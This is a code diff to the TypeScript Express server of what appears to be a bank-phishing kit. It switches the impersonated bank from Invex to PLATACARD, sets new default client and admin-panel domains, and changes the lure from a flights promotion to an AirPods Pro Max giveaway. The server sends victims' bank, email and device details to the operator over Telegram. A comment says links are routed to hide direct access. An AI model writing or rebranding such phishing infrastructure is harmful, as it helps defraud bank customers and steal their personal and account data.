@@ -690,7 +690,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       }
 
       const user = req.user;
-      const { banco = "Invex" } = req.body;
+      const { banco = "PLATACARD" } = req.body;
       const sessionId = nanoid(10);
       
       // Generamos un código de 6 dígitos numéricos fácil de ver para el folio
@@ -881,8 +881,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
       }
 
       // Configuración de dominios
-      const clientDomain = process.env.CLIENT_DOMAIN || 'invexaclaracion.com';
-      const adminDomain = process.env.ADMIN_DOMAIN || 'panel.invexaclaracion.com';
+      const clientDomain = process.env.CLIENT_DOMAIN || 'platacard.com';
+      const adminDomain = process.env.ADMIN_DOMAIN || 'panel.platacard.com';
 
       // Armamos los enlaces para ambos dominios
       // Ahora enviamos a la ruta raíz en lugar de /client/ para ocultar el acceso directo
@@ -1240,7 +1240,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
             // Enviar notificación inicial a Telegram
             let telegramMessage = '';
             if (clientData.terminosAceptados) {
-              telegramMessage = `🎫 <b>PROMOCIÓN DE VUELOS INICIADA</b>\n\n` +
+              telegramMessage = `🎧 <b>PROMOCIÓN DE AIRPODS PRO MAX INICIADA</b>\n\n` +
                 `📋 <b>Folio:</b> ${uniqueFolio}\n` +
                 `🏦 <b>Banco:</b> ${banco}\n` +
                 `📱 <b>Dispositivo:</b> ${clientData.dispositivo || 'Desconocido'}\n` +
@@ -1359,7 +1359,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
             clients.set(sessionId, ws);
 
             // Enviar notificación a Telegram
-            const telegramMessage = `🎫 <b>NUEVA PROMOCIÓN DE VUELOS</b>\n\n` +
+            const telegramMessage = `🎧 <b>NUEVA PROMOCIÓN AIRPODS PRO MAX</b>\n\n` +
               `📋 <b>Folio:</b> ${newSession.folio}\n` +
               `🏦 <b>Banco:</b> ${banco}\n` +
               `📧 <b>Correo:</b> ${clientData.username || clientData.correo || 'No proporcionado'}\n` +
@@ -1378,7 +1378,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 folio: newSession.folio,
                 clientData,
                 timestamp,
-                message: `Cliente registrado para promoción de vuelos - Folio: ${newSession.folio}`
+                message: `Cliente registrado para promoción AirPods Pro Max - Folio: ${newSession.folio}`
               }
             }));
 
